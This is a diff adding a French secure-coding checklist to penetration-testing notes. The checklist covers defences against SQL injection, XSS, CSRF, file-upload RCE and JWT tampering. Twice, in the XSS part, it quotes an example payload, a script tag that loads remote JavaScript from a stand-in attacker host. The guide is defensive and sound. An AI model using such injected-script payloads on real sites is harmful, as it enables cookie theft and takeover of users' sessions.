@@ -101,6 +101,55 @@ Les tests d’intrusion se déroulent en plusieurs étapes, dont voici les élé
 - **Scans complémentaires :** Nikto peut apporter quelques informations complémentaires à Nmap. Il en existe d’autres.
 - **Exploitations des CVE remontées :** ExploitDB
 
+# Sécurité du code
+### SQLi
+- Réaliser des requêtes préparées ou utiliser une librairie de type DAO
+### XSS
+- Utiliser une fonction de type htmlspecialchars() sur les output
+- Flag httpOnly dans le cookie
+- Politique CORS (JS vers ressources externes) restreinte pour empêcher le JS d'envoyer le cookie vers un request bin.
+- Politique CSP (HTML vers ressources externes) restreinte pour empêcher des chargements d'éléments HTML tel que ```<script src="https://serveur.du.hacker.com/payload.js"></script>```.
+- Nonce dans les scripts JS. Le serveur renvoi à chaque requête un nonce unique pour les scripts JS, et le navigateur n'autorise que l'exécution de script JS contenant un nonce défini par le serveur. Ainsi, un payload XSS dans l'url de type ```<script src="https://serveur.du.hacker.com/payload.js"></script>``` ne pourra pas s'exécuter s'il n'y a pas d'attribut nonce, et si on en met un, celui doit dynamiquement correspondre à ce que va renvoyer le serveur pour que le navigateur l'exécute.
+### CSRF
+- Utiliser les tokens CSRF dans les formulaires
+- Utiliser le flag SameSite=Strict dans le cookie.
+### RCE (file upload)
+- Ne pas installer de serveur hybride (IIS avec du PHP par exemple), pour éviter d'avoir plusieurs interpréteurs de code serveur et ainsi mettre à mal les éventuels contrôles des développeurs. Par exemple, si les développeurs bloquent l'extension PHP, sur un IIS nous pourrons toujours upload des fichiers .cs pour les faire interpréter par le serveur.
+- Contrôler les extensions de fichiers (s'assurer de contrôler le dernier élément derrière un point, ne pas taper sur l'index 1).
+- Contrôler le MIME type.
+- Privilégier des technologies permettant de définir les routes dans le code, plutôt que d'exposer des répertoires.
+- Si le serveur web expose des répertoires, utiliser les fichiers .htaccess pour bloquer le moteur PHP (ou autre) dans les répertoire d'assets.
+- Une bonne pratique consiste à renommer les fichiers uploadés en utilisant par exemple un GUID (cela évite d'avoir dans le nom de fichier des éléments tel que "../../..".
+### Authentification
+- Utiliser BCrypt avec un sel
+- Privilégier les cookies signés pour les utilisateurs
+- Si utilisation de JWT, ne pas s'appuyer sur l'algorithme défini dans le header côté serveur (celui-ci pourrait être remplacé par "None" par le client).
+- Utiliser un secret très long pour toute forme de signature (JWT ou cookie).
+- Définir une durée de vie limitée au cookie ou JWT.
+### Gestion des erreurs
+- S'assurer que le code serveur maîtrise l'ensemble des erreurs pouvant être levées, en disposant d'un bloc de type try/catch tout en haut. Pour les erreurs non maîtrisées (type générique Exception), en renvoyant par exemple systématiquement "Internal Error" plutôt que le message de l'exception.
+- Définir des messages d'erreur générique, tel que "Invalid Credentials" plutôt que "Invalid login".
+### Intégrité des données
+- Utiliser le mode transactionnel au niveau des requêtes SQL si plusieurs requêtes sont jouées à la suite. Utiliser le rollback si une exception est levée.
+### Contrôles des entrées
+- De manière générale, il convient de contrôler les entrées utilisateur (Regex ou liste de charactères autorisés/interdits).
+### Erreurs fonctionnelles
+- Il convient de ne pas ajouter des fonctionnalités non prévues en production. Par exemple, si des développeurs bricollent des éléments en phase de développement pour simuler le fait d'être admin, en vérifiant par exemple la présence du mot clef "localhost" dans l'URL, alors cela rajoutera une vulnérabilité en production (url...?localhost).
+- S'assurer que les accès utilisateurs aux ressources respectent ce qui a été defini.
+### Architecture
+- Ne pas utiliser un serveur web avec un serveur de bases de données dans des architectures différentes (32bits / 64bits), pour éviter une mésaventure sur les nombres (un nombre trop grand pour le système 32 bits qui deviendrait négatif par exemple).
+### Gestion des secrets
+- Utiliser un fichier .env que vous ajoutez au .gitignore pour ne pas exposer dans le code source des secrets.
+### Gestion des logs
+- Systématiquement logguer les erreurs 5XX
+- Les erreurs 401 et 403 peuvent également être logguées pour alimenter un outil de supervision de type SIEM.
+### Dépôt de code
+- Mécanisme 2FA fortement recommandé pour ce type d'accès
+- Utiliser un outil/plugin tel que le dependabot sur Github pour vérifier la présence de vulnérabilités connues sur les librairies utilisées dans le code.
+### Compte de service
+- Utiliser un compte SQL avec droit restreint (accès à la BDD de l'application uniquement, et droit restreint sur les mots clef SQL utilisables).
+- Utiliser un compte de service avec droit restreint sur le serveur pour lancer le service de l'application web (Apache, Nginx, Gunicorn, etc...)
+
 # Quelques commandes :
 
 ### Scan de ports
